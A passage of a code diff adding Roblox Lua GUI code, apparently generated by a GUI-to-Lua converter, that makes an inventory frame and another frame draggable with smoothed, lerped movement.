+				if input.UserInputState == Enum.UserInputState.End then
+					dragging = false
+				end
+			end)
+		end
+	end)
+	
+	gui.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			dragInput = input
+		end
+	end)
+	
+	runService.Heartbeat:Connect(Update)
+end
+coroutine.wrap(NMJRDM_fake_script)()
+local function FGZR_fake_script() -- InventoryTopFrame.Drag 
+	local script = Instance.new('LocalScript', InventoryTopFrame)
+
+	local UserInputService = game:GetService("UserInputService")
+	local runService = (game:GetService("RunService"));
+	
+	local gui = script.Parent
+	
+	local dragging
+	local dragInput
+	local dragStart
+	local startPos
+	
+	function Lerp(a, b, m)
+		return a + (b - a) * m
+	end;
+	
+	local lastMousePos
+	local lastGoalPos
+	local DRAG_SPEED = (8); -- // The speed of the UI darg.
+	function Update(dt)
+		if not (startPos) then return end;
+		if not (dragging) and (lastGoalPos) then
+			gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, lastGoalPos.X.Offset, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, lastGoalPos.Y.Offset, dt * DRAG_SPEED))
+			return 
+		end;
+	
+		local delta = (lastMousePos - UserInputService:GetMouseLocation())
+		local xGoal = (startPos.X.Offset - delta.X);
+		local yGoal = (startPos.Y.Offset - delta.Y);
+		lastGoalPos = UDim2.new(startPos.X.Scale, xGoal, startPos.Y.Scale, yGoal)
+		gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, xGoal, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, yGoal, dt * DRAG_SPEED))
+	end;
+	
+	gui.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = true
+			dragStart = input.Position
+			startPos = gui.Position
+			lastMousePos = UserInputService:GetMouseLocation()
+	
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragging = false
+				end
+			end)
+		end
+	end)
+	
+	gui.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			dragInput = input
+		end
+	end)
+	
+	runService.Heartbeat:Connect(Update)
+end
+coroutine.wrap(FGZR_fake_script)()
